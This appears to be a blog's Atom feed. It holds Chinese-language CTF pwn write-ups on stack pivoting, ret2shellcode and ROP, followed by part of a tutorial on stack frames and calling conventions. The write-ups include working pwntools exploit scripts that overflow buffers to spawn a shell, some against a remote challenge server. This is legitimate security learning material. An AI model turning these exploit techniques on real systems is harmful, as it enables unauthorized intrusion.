<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WuTao&#39;s Blog</title>
  
  <subtitle>while(!(succeed = try()));</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://wutao18.github.io/"/>
  <updated>2020-11-01T06:19:21.343Z</updated>
  <id>http://wutao18.github.io/</id>
  
  <author>
    <name>吴涛</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lilac Pwn stack4-stack_pivoting Writeup</title>
    <link href="http://wutao18.github.io/2020/11/01/Lilac-Pwn-stack4-stack-pivoting-Writeup/"/>
    <id>http://wutao18.github.io/2020/11/01/Lilac-Pwn-stack4-stack-pivoting-Writeup/</id>
    <published>2020-11-01T06:16:03.000Z</published>
    <updated>2020-11-01T06:19:21.343Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://pwn.hitctf.cn:8000/challenges" target="_blank" rel="noopener">题目链接</a></p><a id="more"></a><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102142.png" alt="20201101102142"></p><p>文件类型是 64 位 ELF。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102217.png" alt="20201101102217"></p><p>开了 NX 保护。</p><p>用 IDA64 查看一下：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102400.png" alt="20201101102400"></p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102415.png" alt="20201101102415"></p><p>可以看到 print_name 最多只能溢出 2 个字节。</p><p>也就是说只能覆盖 rbp 的最低 2 个字节。</p><p>此时需要使用<strong>栈迁移</strong>的技巧。</p><p>此题相对容易，因为已经给出了 buf 的地址，我们只需要把 main 函数栈帧的 rbp 迁移到 buf 处，然后在 buf 处构造 ROP chain 即可。</p><p>原来 print_name 栈帧的栈底指向 main 栈帧的栈底。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">   +------&gt; |    previous rbp    |    |</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |       ......       |    |</span><br><span class="line">   |        +--------------------+    | main()</span><br><span class="line">   |        |        buf         |    |</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |   return address   |    |</span><br><span class="line">   |        +--------------------+ &lt;--+</span><br><span class="line">   +------- |    previous rbp    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    | print_name()</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        dest        |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>覆盖后 main 栈帧的栈底迁移到 buf，然后在 buf 上构造 ROP chain，这样 main 函数返回后就去执行 ROP chain 了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+      </span><br><span class="line">            |    previous rbp    |     </span><br><span class="line">            +--------------------+     </span><br><span class="line">            |       ......       |     </span><br><span class="line">            +--------------------+     </span><br><span class="line">            |      ROP chain     |     </span><br><span class="line">            +--------------------+ &lt;--+     </span><br><span class="line">   +------&gt; |        buf         |    |</span><br><span class="line">   |        +--------------------+    | main()</span><br><span class="line">   |        |   return address   |    |</span><br><span class="line">   |        +--------------------+ &lt;--+</span><br><span class="line">   +------- |    previous rbp    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    | print_name()</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        dest        |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d stack4 | grep 'plt'</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101122715.png" alt="20201101122715"></p><p>system 函数的地址为 <code>0x400600</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack4 --only "pop|ret" | grep "rdi"</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101122941.png" alt="20201101122941"></p><p><code>pop rdi; ret</code> 的地址为 <code>0x4008a3</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack4 --string "/bin/sh"</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101123241.png" alt="20201101123241"></p><p>字符串 “/bin/sh” 的地址为 <code>0x4008c9</code>。</p><p>所以 payload 为 <code>fake rbp (随便填)</code> + <code>pop rdi; ret</code> + <code>&quot;/bin/sh&quot;</code> + <code>system</code> + <code>填充16个字节</code> + <code>buf 的地址</code></p><p>print_name 中 dest 与 rbp 的距离为 48 个字节，<code>fake rbp (随便填)</code> + <code>pop rdi; ret</code> + <code>&quot;/bin/sh&quot;</code> + <code>system</code> 有 32 个字节，因此还需填充 16 个字节才到 rbp。然后 <code>buf 的地址</code> 只能覆盖 rbp 的最低两个字节，但是足够了，因为 main 函数中 buf 到 rbp 的距离为 256 个字节。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./stack4")</span></span><br><span class="line">p = remote(<span class="string">"47.94.239.235"</span>, <span class="number">2024</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">buf_addr = int(buf_addr[<span class="number">-15</span>:<span class="number">-1</span>], <span class="number">16</span>) <span class="comment"># buf 的地址</span></span><br><span class="line"><span class="comment"># print(hex(addr))</span></span><br><span class="line"></span><br><span class="line">poprdi_addr = <span class="number">0x4008a3</span></span><br><span class="line">binsh_addr = <span class="number">0x4008c9</span></span><br><span class="line">system_addr = <span class="number">0x400600</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([p64(<span class="number">0xdeadbeef</span>), p64(poprdi_addr), p64(binsh_addr), p64(system_addr), <span class="string">'a'</span>*<span class="number">16</span>, p64(buf_addr) ])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"plz"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101124821.png" alt="20201101124821"></p><p>成功拿到 shell。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://pwn.hitctf.cn:8000/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="CTF刷题" scheme="http://wutao18.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
      <category term="PWN" scheme="http://wutao18.github.io/tags/PWN/"/>
    
      <category term="ROP" scheme="http://wutao18.github.io/tags/ROP/"/>
    
      <category term="栈溢出" scheme="http://wutao18.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="栈迁移" scheme="http://wutao18.github.io/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>CTFHUB Pwn ret2shellcode Writeup</title>
    <link href="http://wutao18.github.io/2020/11/01/CTFHUB-Pwn-ret2shellcode-Writeup/"/>
    <id>http://wutao18.github.io/2020/11/01/CTFHUB-Pwn-ret2shellcode-Writeup/</id>
    <published>2020-11-01T06:13:19.000Z</published>
    <updated>2020-11-01T06:20:29.755Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">题目链接</a></p><a id="more"></a><p>checksec 看一下：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101130628.png" alt="20201101130628"></p><p>没有保护。</p><p>IDA 反汇编看一下：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101140409.png" alt="20201101140409"></p><p>可以栈溢出。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101130748.png" alt="20201101130748"></p><p>没有 system 函数。</p><p>gdb vmmap 看一下栈是可执行的：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101131013.png" alt="20201101131013"></p><p>可以把 shellcode 放在返回地址之后，然后把返回地址指向 shellcode。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = p.recvuntil(<span class="string">"]"</span>)</span><br><span class="line">buf_addr = int(buf_addr[<span class="number">-15</span>: <span class="number">-1</span>], <span class="number">16</span>)  <span class="comment"># buf 的地址</span></span><br><span class="line">shellcode_addr = buf_addr + <span class="number">32</span>  <span class="comment"># shellcode 的地址 = buf与rbp的距离16 + rbp的宽度8 + 返回地址的长度8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">24</span> + p64(shellcode_addr) + shellcode</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/skilltree&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="CTF刷题" scheme="http://wutao18.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
      <category term="PWN" scheme="http://wutao18.github.io/tags/PWN/"/>
    
      <category term="ROP" scheme="http://wutao18.github.io/tags/ROP/"/>
    
      <category term="栈溢出" scheme="http://wutao18.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Lilac Pwn stack3-rop Writeup</title>
    <link href="http://wutao18.github.io/2020/11/01/Lilac-Pwn-stack3-rop-Writeup/"/>
    <id>http://wutao18.github.io/2020/11/01/Lilac-Pwn-stack3-rop-Writeup/</id>
    <published>2020-11-01T06:10:46.000Z</published>
    <updated>2020-11-01T06:19:11.295Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://pwn.hitctf.cn:8000/challenges" target="_blank" rel="noopener">题目链接</a></p><a id="more"></a><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095017.png" alt="20201101095017"></p><p>文件类型是 64 位 ELF。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095122.png" alt="20201101095122"></p><p>开了 NX 保护。</p><p>用 IDA64 查看一下：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101100449.png" alt="20201101100449"></p><p>可以看到可以栈溢出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d stack3 | grep 'plt'</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095523.png" alt="20201101095523"></p><p>可以看到有 system 函数，地址为 <code>0x400600</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack3 --string '/bin/sh'</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095700.png" alt="20201101095700"></p><p>可以看到有字符串 “/bin/sh”，地址为 <code>0x4008a4</code>。</p><p>由于是 64 位，参数先保存在 <code>RDI</code>，<code>RSI</code>，<code>RDX</code>，<code>RCX</code>，<code>R8</code>，<code>R9</code>，然后才是栈。</p><p>查看是否有可利用的 gadgets：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack3 --only 'pop|ret' | grep 'rdi'</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101100042.png" alt="20201101100042"></p><p>找到一条。</p><p>那么可以构造 exp 了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./stack3")</span></span><br><span class="line">p = remote(<span class="string">"47.94.239.235"</span>, <span class="number">2023</span>)</span><br><span class="line"></span><br><span class="line">poprdi_addr = <span class="number">0x400883</span></span><br><span class="line">system_addr = <span class="number">0x400600</span></span><br><span class="line">binsh_addr = <span class="number">0x4008a4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101101355.png" alt="20201101101355"></p><p>可以看到成功拿到 shell。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://pwn.hitctf.cn:8000/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="CTF刷题" scheme="http://wutao18.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
      <category term="PWN" scheme="http://wutao18.github.io/tags/PWN/"/>
    
      <category term="ROP" scheme="http://wutao18.github.io/tags/ROP/"/>
    
      <category term="栈溢出" scheme="http://wutao18.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>函数调用过程与栈帧结构</title>
    <link href="http://wutao18.github.io/2020/10/29/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84/"/>
    <id>http://wutao18.github.io/2020/10/29/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84/</id>
    <published>2020-10-29T06:51:59.000Z</published>
    <updated>2020-10-31T10:38:35.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进程内存布局"><a href="#进程内存布局" class="headerlink" title="进程内存布局"></a>进程内存布局</h2><p>32 位保护模式下 Linux 中进程的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0xFFFFFFFF  ------&gt; +----------------------+ &lt;--+ </span><br><span class="line">                    |                      |    | </span><br><span class="line">                    |       OS Kernel      |    | 1GB</span><br><span class="line">                    |                      |    |</span><br><span class="line">0xC0000000  ------&gt; +----------------------+ &lt;--+ </span><br><span class="line">                |   |                      |    |</span><br><span class="line">                |   |         stack        |    |</span><br><span class="line">                v   |                      |    |</span><br><span class="line">                    +----------------------+    |</span><br><span class="line">                    |                      |    |</span><br><span class="line">                    +----------------------+    |</span><br><span class="line">                    | Memory Mapping Region|    |</span><br><span class="line">0x40000000  ------&gt; +----------------------+    |</span><br><span class="line">                    |                      |    |</span><br><span class="line">                    +----------------------+    |</span><br><span class="line">                ^   |                      |    |</span><br><span class="line">                |   |         heap         |    | 3GB</span><br><span class="line">                |   |                      |    |</span><br><span class="line">                    +----------------------+    |</span><br><span class="line">                    |  Read&#x2F;Write Segments |    |</span><br><span class="line">                    |        .bss          |    |</span><br><span class="line">                    |        .data         |    |</span><br><span class="line">                    +----------------------+    |</span><br><span class="line">                    |  Read-only Segments  |    |</span><br><span class="line">                    | .init .text .rodata  |    |</span><br><span class="line">                    |                      |    |</span><br><span class="line">0x08048000  ------&gt; +----------------------+    |</span><br><span class="line">                    |       reserved       |    |</span><br><span class="line">0x00000000  ------&gt; +----------------------+ &lt;--+</span><br></pre></td></tr></table></figure><a id="more"></a><p>32 位下寻址空间为 4GB，其中高地址的 1GB 是给操作系统内核使用的（Windows 中默认为 2GB），称为<strong>内核空间</strong>（Kernel Space），剩余的 3GB 分配给应用程序使用，称为<strong>用户空间</strong>（User Space）。当进程运行在内核空间时就处于<strong>内核态</strong>（Kernel Mode），当进程运行在用户空间时就处于<strong>用户态</strong>（User Mode）。</p><p>区分用户态和内核态是为了提高系统的稳定性和安全性，使操作系统能够控制资源的访问，能够防止应用程序执行一些危险的指令。计算机体系结构中，在硬件上提供不同的特权态，即 Rings Protection，如 Intel CPU 有 4 个特权级：Ring0、Ring1、Ring2、Ring3，一般操作系统只使用 Ring0 和 Ring3，Ring0 具有最高权限，能够访问任何资源，Ring3 访问受限，需要陷入（trap）到内核态才能访问特权资源。</p><p><strong>栈</strong>（stack）从虚拟地址 <code>0xC0000000</code> 往低地址增长。<strong>堆</strong>（heap）正好相反，从低地址往高地址增长。栈用于函数调用以及存放局部变量等，堆用于动态内存分配，如 C 语言中的 malloc() 函数。栈与操作系统内核之间有一个随机的 offset，堆与读/写段之间也有一个随机的 offset。</p><p><strong>内存映射段</strong>（Memory Mapping Segment）用于将文件内容映射到内存，用于加载动态链接库，可以通过 mmap() 系统调用实现内存映射。</p><p><strong>bss 段</strong>放的是未初始化的全局变量和静态变量，默认都初始化为 0，<strong>data 段</strong>存放的是初始化的全局变量和静态变量。</p><p><strong>text 段</strong>存放的是程序代码，除了可读还具有可执行权限。</p><h2 id="栈及其操作"><a href="#栈及其操作" class="headerlink" title="栈及其操作"></a>栈及其操作</h2><p>栈是一种先进后出的结构，包含两种操作：<code>push</code> 和 <code>pop</code>。</p><p>在 IA-32 体系结构中，通常用 <code>ESP</code> 和 <code>EBP</code> 维护一个栈，<code>EBP</code> 指向栈底，<code>ESP</code> 指向栈顶。</p><p>IA-32 中 <code>PUSH</code> 指令先减少 <code>ESP</code> 的值，再将源操作数复制到堆中。</p><p>如 <code>PUSH EAX</code> 等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP, 4</span><br><span class="line">MOV [ESP], EAX</span><br></pre></td></tr></table></figure><p><code>POP</code> 指令正好相反，如 <code>POP EBX</code> 等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EBX, [ESP]</span><br><span class="line">ADD ESP, 4</span><br></pre></td></tr></table></figure><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p><strong>栈帧</strong>（stack frame）用于函数调用，每一次函数调用都会有一个独立的栈帧，包含了返回地址、局部变量、上下文等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address        </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">   +------&gt; |    previous EBP    |    |</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |  saved registers   |    |</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |  local variables   |    | caller&#39;s frame</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |   callee&#39;s args    |    |</span><br><span class="line">   |        +--------------------+    |</span><br><span class="line">   |        |   return address   |    |</span><br><span class="line">   |        +--------------------+ &lt;--+</span><br><span class="line">   +------- |    previous EBP    |    |</span><br><span class="line">            +--------------------+    | </span><br><span class="line">            |  local variables   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |                    |    | callee&#39;s frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            |                    |    |</span><br><span class="line">            |                    |    |</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p><strong>调用者</strong>（Caller） 调用 <strong>被调用者</strong>（Callee），每次调用都会有新的栈帧压栈，所以一般深度优先搜索可以用栈来代替递归，以达到更深的搜索深度。</p><p><code>ESP</code> 和 <code>EBP</code> 只维护当前的栈帧，因此之前的栈帧都要保存下来，栈帧的顶部保存了上一个栈帧的 <code>EBP</code> 指向的位置，函数返回时 <code>EBP</code> 能够恢复到上一个栈帧的 <code>EBP</code>。</p><h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><h3 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h3><p>调用者 调用 被调用者 前，先保存返回地址，即下一条指令的地址，用于返回后继续执行，然后进入被调用者函数。</p><p>被调用者开辟了新的栈帧，因此需要保存调用者的栈帧，通常使用以下两条指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br><span class="line">MOV EBP, ESP</span><br></pre></td></tr></table></figure><p>先把旧的 <code>EBP</code> 入栈，然后让 <code>EBP</code> 指向旧的 <code>EBP</code>，此时 <code>EBP</code> 已经作为新的栈帧的栈底了。</p><p>函数调用时，为了防止寄存器被覆盖，有时需要将寄存器内容也保存到栈中。</p><h3 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h3><p>IA-32 下，在调用者函数中，参数从右往左入栈。进入被调用者函数时，参数以及局部变量的访问以 <code>EBP</code> 为基址，通过 <code>EBP</code> 加上偏移量访问。</p><p>x86-64 下参数传递略有不同。如果函数调用参数少于 7 个，则用寄存器传递参数，参数从左到右依次放入寄存器 <code>RDI</code>，<code>RSI</code>，<code>RDX</code>，<code>RCX</code>，<code>R8</code>，<code>R9</code>。参数超过 7 个时，前 6 个参数同样通过寄存器传参，之后的参数与 32 位一样从右往左压入栈中。</p><h3 id="返回过程"><a href="#返回过程" class="headerlink" title="返回过程"></a>返回过程</h3><p>返回值保存在 EAX 寄存器中。</p><p>返回时先将 <code>EBP</code> 恢复至上一个栈帧的栈底，通常使用以下两条指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP, EBP</span><br><span class="line">POP EBP</span><br></pre></td></tr></table></figure><p>然后将保存的返回地址放入 <code>EIP</code> 寄存器。</p><p>最后将保存的参数出栈。</p><h3 id="涉及的指令"><a href="#涉及的指令" class="headerlink" title="涉及的指令"></a>涉及的指令</h3><ul><li><code>CALL</code> 指令</li></ul><p>先将当前 EIP（即下一条指令的地址作为返回地址）压入栈中，然后 EIP 转移到被调用者的入口地址。</p><ul><li><code>RET</code> 指令</li></ul><p>从栈顶弹出原来保存的地址至 EIP。</p><ul><li><code>LEAVE</code> 指令</li></ul><p>通常将返回时涉及的两条指令用 <code>LEAVE</code> 指令代替，也就是说 <code>LEAVE</code> 等价于上述提到的两条指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP, EBP</span><br><span class="line">POP EBP</span><br></pre></td></tr></table></figure><h3 id="函数的调用约定"><a href="#函数的调用约定" class="headerlink" title="函数的调用约定"></a>函数的调用约定</h3><p>上述参数从右往左入栈、返回值存入 <code>EAX</code> 寄存器等不是硬性规定的，而是遵守函数的<strong>调用约定</strong>（calling convention）。函数的调用约定规定了参数的传递顺序、参数和返回值放置的位置、调用前后设置的工作由调用者完成还是被调用者完成等。上文提到的都是 C 调用约定（cdecl调用约定）。其他的调用约定有 stdcall调用约定、fastcall调用约定、thiscall调用约定等。</p><h3 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h3><p>以一个加法函数为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: add.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = a + b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    